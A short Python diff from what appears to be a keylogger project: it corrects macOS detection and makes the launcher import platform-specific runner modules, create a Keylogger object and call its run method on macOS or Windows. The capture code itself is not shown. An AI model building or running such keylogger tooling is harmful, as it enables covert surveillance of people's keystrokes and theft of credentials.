@@ -4,10 +4,14 @@ import time, datetime
 import platform
 
 osName = platform.uname().system
-if osName == "macOS":
-  import macOS_runner
+init = None
+
+if osName == "Darwin":
+  import client_runner.macOS_runner as macOS_runner
+  init = macOS_runner.Keylogger()
 elif osName == "Windows":
-  import Windows_runner
+  import client_runner.Windows_runner as Windows_runner
   init = Windows_runner.Keylogger()
-  print(init.get_os_info())
-  init.run()
+
+print(init.get_os_info())
+init.run()
